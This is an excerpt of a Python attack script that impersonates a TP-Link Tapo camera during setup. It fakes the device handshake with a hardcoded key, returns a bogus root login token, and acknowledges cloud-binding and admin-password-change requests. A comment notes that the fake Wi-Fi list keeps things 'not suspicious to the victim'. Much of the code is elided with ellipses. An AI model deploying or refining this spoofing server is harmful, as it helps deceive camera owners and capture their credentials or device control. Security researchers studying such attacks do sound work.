...
chmod +x tapofakewan.py
python3 tapofakewan.py
"""
...
def handle_incoming_handshake_request(payload, our_ip):
    iv = b"1234567890123456"
    key = b"1234567890123456"
    clearSessionKeyBytes = iv + key

    cipher = TpLinkCipher(iv, key)
    data = { "device_id": "11111111111111111111CE6645443EAE20758575", "http_port": 50443, "connect_type": "wireless", "connect_ssid": "", "owner": "", "sd_status": "offline" }
...
def handshake_server(our_ip):
    ...
    while True:
       ...
       try:
           ...
           continue
       response = handle_incoming_handshake_request(request, our_ip)
...
class MyHttpRequestHandler(http.server.SimpleHTTPRequestHandler):
    ...
    def _post_logic(self, post_data):
        if b"login" in post_data:
            return {"error_code": 0, "result" : { "stok": "9a3ee78ece370dae0c309483d9d466b4", "user_group": "root"}}
        if b"bindToCloud" in post_data:        
            return { "result": { "responses": [ { "method": "bindToCloud", "result": { }, "error_code": 0 }, { "method": "changeAdminPassword", "result": { }, "error_code": 0 },{ "method": "setMediaEncrypt", "result": { }, "error_code": 0 },{ "method": "setTimezone", "result": { }, "error_code": 0 },{ "method": "setRecordPlan", "result": { }, "error_code": 0 } ] }, "error_code": 0 }
        if b"scanApList" in post_data:
            # NOTE: we could return a valid list of SSIDs here so it is not suspicious to the victim
            return { "error_code": 0, "result": { "onboarding": { "scan": { "wpa3_supported": "false", "ap_list": [ { "ssid": "SomeValidAP", "bssid": "40-3F-8C-99-91-48", "auth": 3, "encryption": 2, "rssi": 0 } ] } } } }
